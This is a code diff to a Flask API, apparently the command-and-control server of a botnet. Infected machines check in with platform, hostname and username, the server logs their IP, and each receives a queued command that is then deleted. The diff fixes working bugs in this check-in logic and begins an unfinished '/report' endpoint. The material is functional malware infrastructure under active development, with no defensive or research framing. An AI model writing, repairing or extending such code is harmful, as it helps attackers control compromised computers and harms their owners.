@@ -2,7 +2,7 @@ from flask import Blueprint, request, abort, current_app, url_for, send_file, re
 from datetime import datetime
 from models import Bot
 from models import Command
-
+from models import db
 api = Blueprint('api', __name__)
 
 
@@ -26,23 +26,26 @@ def push(bot_id):
 
 
 #API call to check status of a bot
-@api.route('/<bot_id>/status', methods=['post'])
+@api.route('/<bot_id>/status', methods=['POST'])
 def get_status(bot_id):
 	bot = Bot.query.get(bot_id)			#set bot equal to var
 	if not bot:							#if doesnt exist then create new bot obj and add to db (new bot)
 		bot = Bot(bot_id)				
-		db.session.add(bot_id)
-		db.session.commit()
-	info = request.json					#api call by post with json obj, update the db with the json obj
+		#db.session.add(bot)
+		#db.session.commit()
+	info = request.get_json()					#api call by post with json obj, update the db with the json obj
 	if info:							#updates bot info each time 
-		if 'os' in info:
-			bot.os = os
+		if 'platform' in info:
+			bot.os = info['platform']
 		if 'hostname' in info:
-			bot.hostname = hostname
+			bot.hostname = info['hostname']
 		if 'username' in info:
-			bot.username
+			bot.username = info['username']
 	bot.ip = request.remote_addr		#update ip address and last ping to now
 	bot.last_ping = datetime.now()
+	db.session.add(bot)
+	db.session.commit()
+	print(bot.username)
 	pending_cmd = ''					#check if the bot has any commands pending, if so then delete it and return it
 	cmd = bot.commands.order_by(Command.timestamp.desc()).first()
 	if cmd:
@@ -50,3 +53,8 @@ def get_status(bot_id):
 		db.session.delete(cmd)
 		db.session.commit()
 	return pending_cmd
+
+@api.route('/<bot_id>/report', methods=['POST'])
+def get_report(bot_id):
+	bot = Bot.query.get(bot_id)
+	
